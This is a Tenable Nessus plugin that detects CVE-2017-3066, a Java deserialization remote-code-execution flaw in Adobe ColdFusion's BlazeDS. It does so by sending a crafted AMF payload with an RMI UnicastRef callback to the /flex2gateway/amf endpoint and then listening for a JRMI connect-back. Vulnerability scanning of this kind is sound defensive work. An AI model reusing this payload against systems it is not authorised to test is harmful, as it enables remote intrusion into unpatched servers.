#TRUSTED 56a4487ea93d49ca4a9b5230aa56666ef00874e190e031bc1c429a5740cdef0edee1133c56bbf199ddd48cce5f45bc6532f81d3ce988c63158016678868872de011a2bcc5fe525633178c584225dfe80b251107b4505fffce02859d3c21fe65199aee98c8d999496b31b3f68d6ef8d755dfbf850c69ff88f12586fbc1f39bb9232fbe42401ad86aba0b63c8bee38819766876fe3c8d33e57de31c39af624ed4f75dd8553f0235224f0d44882c37dd33908e6db0f75cf5a77da8a3255ec127f7e782b3451d748a4adb5754779b20b212f0185270342be886437bed5695c37eae269cb483e041601aa08c0065c4821b0cb51583f93431e5bf7c826a4d5314ac6fac059ebf79ea8e5d6c072ab466c5afd3270c693da312939cd4ea62bee4528ef4b2a33f9e97229e46b24b70d9a1513f8a1ba8881ca14e0e8d04051f4fbf55a41186fa77ba79432dff9b3f33bbdfec58d9eaef5b5bd9198f421506621f6aabe98ea8f04eb56f0c20467eb9b22c23f99ee4d36669d9e9f19e61cdcd96200b332308994902303894d03a741aeb661fe2257ce2d9b5de4eac137184733ad49d9d872be3b62d9b41709e69a5631ca63bbe7cdae3f6b906d8a0ecaa25652ca518f42da0893ec3cd0d33121d86f2b515b1ab4efbeadf89bca43cadd2377093106c25150e8e827ed27a42a4e7fe25956a7518650b33fcc1a35faa03323ad648ddc49093346
#TRUST-RSA-SHA256 75bfc4724fb6f60d5814419866ca6acb626ab02066751660b893e6c34d381b41704461203b4abc143f2d6ab63a9afea717e6e85072da3f3280801a75dac53138ff3dfbaf33d7efdb5d5151234ad040430f6275f09cb24d590e698fd0d6bba98c0f3ea0910943d258faf6820549fd9f9177a1e6a0d5ad7ff9f3f7480019fbb3955bd265045f1d76dfcfe890a4df27c5ad243cce5431da98f6b3c7128e204cd371788f4088416fadd79929cccf2db774ad4e6a56d79a7cece28aa57e43b8687b12d02179bf5239773deb101736aabb1e1fbe1b97490dd586a59f5a17cc47f93e8371317f229dd674222447788e9d4ad065bf8eb015cd13116e3f78a8543b6d7e5163794de9c235875acd841a07e9a8df8e943a743db9e1dd2ec4742cae57effb16869befabde813774bf56e54034c8122c0466011a50c9d59c6b0362f38f7c85764dddd838ff6c2af3fc2abe3be84811e961f7f7a4a6f713bce2ab0ada4381dad03e9579894cc2697c077e15bf06db8ee5584419943e76ae8ca891ab7b469ce8ad21272c6f437ca9aa81a822eb4b769fb025f03cd75e624c7dceb9689ff6dc68705f103bf928150f047fd36ecbaa2bfda35ffc03b48d277288520ec93c1159b89a82dbe94d977b8137c284fcf76ac74c94357873e724af91b0b59f9c1137c5d9a526e4c7b5f3433a47531835a9b3cc3ac921c406b0a0135d302064971d450e7190

#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(99731);
  script_version("1.13");
  script_set_attribute(attribute:"plugin_modification_date", value:"2025/02/24");

  script_cve_id("CVE-2017-3066");
  script_bugtraq_id(98003);
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2025/03/17");

  script_name(english:"Adobe ColdFusion BlazeDS Java Object Deserialization RCE");

  script_set_attribute(attribute:"synopsis", value:
"A web-based application running on the remote host is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host is affected
by a Java deserialization flaw in the Apache BlazeDS library when
handling untrusted Java objects. An unauthenticated, remote attacker
can exploit this to execute arbitrary code.");
  script_set_attribute(attribute:"see_also", value:"https://codewhitesec.blogspot.com/2017/04/amf.html");
  script_set_attribute(attribute:"see_also", value:"https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Adobe ColdFusion version 10 update 23 / 11 update 12 / 2016
update 4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-3066");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/04/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/04/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/04/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2025 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("coldfusion_detect.nasl");
  script_require_keys("installed_sw/ColdFusion");
  script_require_ports("Services/www", 80, 8500);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);
port = get_http_port(default:80);
install = get_single_install(app_name:app, port:port);

# create the listening socket the attack will call back to
bind_result = bind_sock_tcp();
if (isnull(bind_result) || len(bind_result) != 2) exit(1, "Failed to create bind socket.");
listening_soc = bind_result[0];
listening_port = bind_result[1];

# connect to the server
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, app);

# generate the connect back
cb_address = compat::this_host();
amf_payload = '\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' +
              '\x07\x33sun.rmi.server.UnicastRef' + mkword(len(cb_address)) + cb_address +
              mkdword(listening_port) +
              '\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00';

# build the request
request = 'POST /flex2gateway/amf HTTP/1.1\r\n' +
          'Host: ' + get_host_ip() + ':' + port + '\r\n' +
          'Content-Type: application/x-amf\r\n' +
          'Content-Length: ' + len(amf_payload) + '\r\n' +
          '\r\n' + amf_payload;

# send the request
send(socket:soc, data:request);
 
# listen for the connect back
cb_soc = sock_accept(socket:listening_soc, timeout:5);
if (!cb_soc)
{
  close(listening_soc);
  close(soc);
  audit(AUDIT_LISTEN_NOT_VULN, app, port);
}

# grab the result 
resp = recv(socket:cb_soc, length:4096);

# close all the sockets
close(cb_soc);
close(listening_soc);
close(soc);

# ensure the connect back is what we expected
if ('JRMI' >!< resp) audit(AUDIT_LISTEN_NOT_VULN, app, port);

report =
  '\nNessus was able to exploit a Java deserialization vulnerability by' +
  '\nsending a crafted Java object.' +
  '\n';
security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
